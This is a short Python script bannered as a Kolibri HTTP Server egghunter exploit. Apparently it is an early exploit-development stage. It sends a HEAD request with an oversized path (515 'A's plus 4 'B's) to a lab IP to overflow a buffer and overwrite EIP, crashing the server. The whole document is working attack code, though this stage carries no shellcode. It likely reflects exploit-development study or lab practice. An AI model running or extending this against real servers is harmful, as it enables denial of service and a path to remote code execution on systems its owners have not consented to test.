#!/usr/bin/python

import socket
import os
import sys

banner = """
#----------------------------------------------#
Kolibri HTTP Server Exploit - Egghunter
#----------------------------------------------#
"""

print banner

#crash the application with the "B"s in EIP
Stage1 = "A"*515 + "B"*4

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 172.16.73.129:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("172.16.73.129", 8080))
expl.send(buffer)
expl.close()
